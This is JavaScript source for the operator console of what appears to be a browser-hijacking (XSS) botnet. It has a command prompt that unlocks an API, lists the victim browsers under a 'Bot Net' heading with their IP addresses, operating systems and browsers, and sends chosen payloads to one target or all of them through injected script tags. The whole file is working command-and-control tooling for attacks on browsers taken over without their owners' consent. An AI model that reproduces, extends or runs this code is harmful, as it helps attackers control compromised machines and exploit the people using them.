/**
 * Focus on the command prompt
 */
function foc() { document.getElementById("cmd").focus(); }
window.onkeydown = foc;
foc();

// refresh host list every 3 seconds
var intfetch = window.setInterval(fetch_list, 3000);
var intdebug = false;

var gpass = "";
var gbuffer = [];
var gbidx = -1;
var glistSz = 0;
var running_jobs = 0;
var module_path = "/";
var params = {};
var debug_host = '';
params['target'] = "all";
params['payload'] = "alert";
params['message'] = "payload 1";

function xssgbi(x) { return document.getElementById(x); }
function xsscls(t) { xssgbi('sploit').innerHTML=""; }

function display_help() {
	com_out("<dl>");
	com_out("<dt>unlock &lt;password&gt;</dt>");
	com_out("<dd>unlock the console</dd>");
	com_out("<dt>show</dt>");
	com_out("<dd>show the current module options</dd>");
	com_out("<dt>info &lt;module&gt;</dt>");
	com_out("<dd>show the info and help about a module (or current module)/dd>");
	com_out("</dl>");
}

function display_prompt() {
	elm = document.getElementById("prompt");
	elm.innerHTML = "("+running_jobs+") " + module_path + " # ";
}

function exploit() {
	var opts = "";
	for (x in params) { opts += "&" + x + "=" + encodeURIComponent(params[x]); }
	cs("/api.php?auth="+gpass+"&A=exploit"+opts);
	com_out("sending " + params['payload'] + " to " + params['target']);
}

function fetch_list() {
	if (gpass) { 
		cs("/api.php?auth="+gpass+"&A=list");
	}
}
/*
function update_debug() {
	var o = "<div class='debug'>";
	for (x in debugLog) {
		o += x + "<br />";
	}
	o += "<div>";

	document.getElementById("out_content").innerHTML += o;
}
*/
function show_host(i) {
	var o = "<dl>"
	for (var x in host_list[i]) {
		o += "<dt>"+x+"</dt>";
		o += "<dd>"+host_list[i][x]+"</dd>";
	}
	o += "</dl>";

	document.getElementById("out_title").innerHTML = "Detail Host (" + host_list[i]['remote_ip'] + ")";
	document.getElementById("out_content").innerHTML = o;
	debug_host = host_list[i]['guid'];
	get_debug();
}

function target(g) { 
	if (g == params['target']) {
		params['target'] = '';
		com_out("unset target");
		if (intdebug)
			window.clearInterval(intdebug);
	}
	else {
		params['target'] = g;
		debug_host = g;
		com_out("target set to " + g);
		if (intdebug)
			window.clearInterval(intdebug);
		intdebug = window.setInterval(get_debug, 3000);
	}
	update_list();
}

function get_debug() {
	console.log("debug... " + debug_host);
	window.setInterval(cs("/api.php?auth="+gpass+"&A=debug&guid="+debug_host));
}
function append_content(c) {
	document.getElementById("out_content").innerHTML += c;
}

function update_list() {
	var o = "<ul>";
	for (var i in host_list) {
		var target="target2.png";
		var cl = host_list[i]['class'];
		if (host_list[i]['guid'] == params['target'] || params['target'] == 'ALL') {
			cl += " target";
			target="target.png";
		}

		o += "<li class=\""+cl+"\" onclick=\"show_host("+i+")\"><img width=\"16\" src=\"/ico/"+host_list[i]['os']+".png\" /> <img width=\"16\" src=\"/ico/"+host_list[i]['browser']+".png\" /><strong>"+host_list[i]['remote_ip']+"</strong><img src=\"/ico/"+target+"\" width=\"16\" onclick=\"target('"+host_list[i]['guid']+"')\" class=\"right\"/></li>";
	}
	o += "</ul>";
	document.getElementById("list_title").innerHTML = "Bot Net (" + host_list.length + ")";
	document.getElementById("list_content").innerHTML = o;
	if (host_list.length > glistSz) { com_out("Host Joined The Bot Net"); }
	if (host_list.length < glistSz) { com_out("Host Left The Bot Net"); }
	glistSz = host_list.length;
}
function cs(s) { //console.log("cs: " + s); 
	var script = document.createElement("script");
	script.type="text/javascript";
	script.src=s;
	d=document.getElementById("sploit");
	d.appendChild(script);
}
//	append("<script src='"+s+"'></script>"); }
function append(t) {d = document.getElementById('sploit');console.log(d);r=d.innerHTML;console.log(r);d.innerHTML=t; }
function com_out(t) { var e = document.getElementById('cmd_content'); e.innerHTML += t + "<br />"; e.scrollIntoView(false); e.scrollTop = e.scrollHeight; }
function show_options() { for (x in params) { com_out(x + " = " + params[x]); } }


function handle_command(event) {

elm = document.getElementById("cmd");
if(event && event.keyCode == 13) {
	gbuffer.push(elm.value);
	gbidx++;
	var p = elm.value.split(" ");
	switch(p[0]) {
		case "unlock":
			gpass= p.slice(1).join(" ");
			fetch_list();
			com_out("password set<br />API unlocked");
			break;

		case "show":
			show_options();

		case "set":
			if (p.length > 2) {
				var name = p[1]
				var v = p.slice(2).join(" ");
				params[name] = v
				com_out(name + " set to " + v);
				//console.log(p);
				//console.log(p[1] = params[p[1]]);
			}
			break;

		case "exploit":
			exploit();
			break;
	}

	elm.value = "";
	display_prompt();
}

else if (event && event.keyCode == 38) {
	//if (gbidx == gbuffer.length -1 && elm.value.length > 0) { console.log("push!"); gbuffer.push(elm.value); }
	console.log(gbidx +  " up " +  gbuffer.length);
	if (gbidx > 0) {
		//gbidx--;
		elm.value = gbuffer[gbidx--];
	}
} else if (event && event.keyCode == 40) {
	console.log(gbidx +  " down " + gbuffer.length);
	if (gbidx < gbuffer.length) {
		//gbidx++;
		elm.value = gbuffer[gbidx++];
	} if (gbidx >= gbuffer.length) {
		elm.value = "";
	}
}
}

display_prompt();
